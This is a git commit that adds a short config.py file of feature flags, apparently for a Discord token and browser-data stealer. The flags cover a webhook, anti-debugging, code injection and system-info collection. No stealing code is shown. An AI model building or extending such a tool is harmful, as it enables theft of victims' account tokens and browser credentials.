e25f2a6a22e771bd2d64f80c87f8f841eb6b2ace
Outhacker090 <Eliaskulmer989@gmail.com>
2025-08-25 15:54:55 +0200

    Add files via upload

---
+++ good-main/src/config.py
@@ -0,0 +1,9 @@
+__CONFIG__ = {
+    'webhook' : None,
+    'antidebug' : True,
+    'browsers' : True,
+    'discordtoken' : True,
+    'injection' : True,
+    'startup' : False,
+    'systeminfo' : True,
+}
